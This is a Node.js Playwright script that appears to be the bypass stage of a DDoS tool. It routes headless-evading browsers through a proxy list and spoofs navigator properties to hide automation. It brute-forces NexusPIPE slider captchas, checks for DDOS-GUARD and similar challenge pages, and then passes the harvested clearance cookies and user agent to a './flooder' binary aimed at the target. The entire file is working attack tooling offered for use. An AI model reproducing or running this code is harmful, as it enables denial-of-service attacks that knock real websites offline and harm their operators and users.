const {
  chromium
} = require('playwright-extra');
const {spawn} = require('child_process');
const os = require('os');
const dns = require('dns');
const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
var request = require('request');
const fsPromises = require('fs/promises');
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const {
  PassThrough
} = require('stream');
const JSStreamSocket = new tls.TLSSocket(new PassThrough())._handle._parentWrap.constructor;
const path = require('path');
if (process.argv.length < 6) {
    console.log('xvbf-run -a node file.js URL Time Threads Proxies');
    console.log('https://sheesh.rip/ 120 5 http.txt optional(<debug>)');
    process.exit(0);
}
let bypassed = false;

const target = process.argv[2], time = process.argv[3],thread = process.argv[4], proxy = process.argv[5];
//process.on('uncaughtException', function (err) {});
setTimeout(() => {
  process.exit()
}, time*1000);
proxies = fs.readFileSync(proxy, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
        
if (cluster.isPrimary) {
  for (let i = 0; i < thread; i++) cluster.fork();
  setTimeout(() => process.exit(0), Number(time) * 1000);
} else {
async function run() {
const proxer = proxies[~~(Math.random() * (proxies.length - 1))];
const tmpD = await fsPromises.mkdtemp(path.join(os.tmpdir(), 'profile-'));
chromium.launch({
      ignoreDefaultArgs: true,
      javaScriptEnabled: true,
      timeout: 60000,
      headless: false,
      permissions: ['camera', 'microphone'],
      args: [`--proxy-server=${proxer}`, '--no-first-run', '--no-service-autorun', '--use-gl=swiftshader', '--use-angle=angle', '--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', `--user-data-dir=${tmpD}`, '--disable-shared-workers', '--remote-debugging-pipe','--use-fake-device-for-media-stream','--use-fake-ui-for-media-stream','--disable-features=IsolateOrigins,site-per-process','--disable-blink-features=AutomationControlled']
    }).then(async browser => {
  try {
  const context = await browser.newContext({
          serviceWorkers: 'block',
          timeout: 60000
        });
  context.setDefaultTimeout(60000)
  context.setDefaultNavigationTimeout(30000)
          
        
        
        
  const page = await context.newPage({ deviceScaleFactor: 1 })
  const cdp = await page.context().newCDPSession(page);
	await cdp.send('Media.enable');	
	await cdp.send('Network.enable');  
  await page.emulateMedia({ colorScheme: 'dark' })
  await page.addInitScript(() => Object.defineProperty(navigator, 'webdriver', {
          get: () => false
        }));
  await page.addInitScript(() => {	
		['height', 'width'].forEach(property => {
		  const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
		  Object.defineProperty(HTMLImageElement.prototype, property, {
			...imageDescriptor,
			get: function() {
			  if (this.complete && this.naturalHeight == 0) {
				return 20;
			  }
			  return imageDescriptor.get.apply(this);
			},
		  });
		});		
	});	
	
	await page.addInitScript(() => {	
		Object.getPrototypeOf(Notification, 'permission', {
			get: function() {
				return 'default';
			}
		});	
	});	
	
	await page.addInitScript(() => {	
		Object.defineProperty(navigator, 'pdfViewerEnabled', {
			get: () => true,
		});	
	});			

	await page.addInitScript(() => {
		Object.defineProperty(navigator.connection, 'rtt', {
			get: () => 50,
		});
	});	

	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'share', {
			get: () => false,
		});	
	});
	
	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'canShare', {
			get: () => false,
		});	
	});		
	
	await page.addInitScript(() => {
		Object.defineProperty(navigator, 'bluetooth', {
			get: () => false,
		});	
	});
  await page.setViewportSize({width: 1920, height: 1080});
  const getUA = await page.evaluate(() => navigator.userAgent);
  if(process.argv[6] == 'debug') {
    console.log('Browser! Proxy: '+proxer + ' | UserAgent: '+getUA);
  }
  page.on('response', async response => {
        try {
            if(await response.url().includes("/.nexus/pipe/")){
            if(await response.url().includes("/.nexus/interact/") && await response.status() == 200){
                console.log('[ Response ]: '+await response.url()+" -> "+await response.status()+" "+await response.statusText());
                bypassed = true
            }
            } else {
            bypassed = true
            }
        } catch (e) {console.log(e)}
  });

  await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 15000 })
  while(!bypassed){
     await solve(page)
  }
  await page.evaluate(() => {
    setInterval(() => {
        const x = Math.floor(Math.random() * window.innerWidth);
        const y = Math.floor(Math.random() * window.innerHeight);
        const element = document.elementFromPoint(x, y);
        element.dispatchEvent(new MouseEvent('mousemove', {
            clientX: x,
            clientY: y
        }));
        element.dispatchEvent(new MouseEvent('mouseover', {
            clientX: x,
            clientY: y
        }));
        element.dispatchEvent(new MouseEvent('mouseenter', {
            clientX: x,
            clientY: y
        }));
        element.dispatchEvent(new MouseEvent('mousedown', {
            clientX: x,
            clientY: y
        }));
        element.dispatchEvent(new MouseEvent('mouseup', {
            clientX: x,
            clientY: y
        }));
        element.dispatchEvent(new MouseEvent('click', {
            clientX: x,
            clientY: y
        }));
    }, 3000);
});
  const title = await page.title();
  if (!title.includes('Access denied') && !title.includes('DDOS-GUARD') && !title.includes('Captcha Challenge')) {
  if (!title.includes('Just a moment...') && !title.includes('Checking your browser...') && !title.includes('Security Challenge') && !title.includes('CAPTCHA | NexusPIPE') && !title.includes('Challenge | NexusPIPE')) {
  const cookies = (await context.cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
  console.log('Solved! Proxy: '+proxer + ' | UserAgent: '+getUA + ' | Cookie: '+cookies + ' | Title: '+title);
    const ls = spawn('./flooder', [target,time,proxer,thread,cookies,getUA]);
  } else {
  await page.waitForTimeout(8000)
  const title = await page.title();
  const cookies = (await context.cookies(target)).map(c => `${c.name}=${c.value}`).join('; ');
  console.log('Solved! Proxy: '+proxer + ' | UserAgent: '+getUA + ' | Cookie: '+cookies + ' | Title: '+title);
    const ls = spawn('./flooder', [target,time,proxer,thread,cookies,getUA]);
  }
  } else {
  run()
  }
  
  } finally {
    await browser.close();
  }
  }).catch((e) => {run();});
 }
run();
}

async function solve(page){
    await page.waitForTimeout(3000)
    if(!bypassed){
    let slider = await page.waitForSelector('.slider');
    let bBox = await slider.boundingBox()
    await slider.click()
  
    console.log("[ Solving ] ...")
  
    for(let i = bBox.x; i < bBox.x+bBox.width; i = i + 1){
      if(!bypassed){
          await page.mouse.click(i, bBox.y)
      }
    }
    }
  
    if(!bypassed){
      console.log("[ Error ]: Failed to solve! Retrying ...")
    } else {
      console.log('Solved!');
      await page.waitForTimeout(5000)
    }
    
}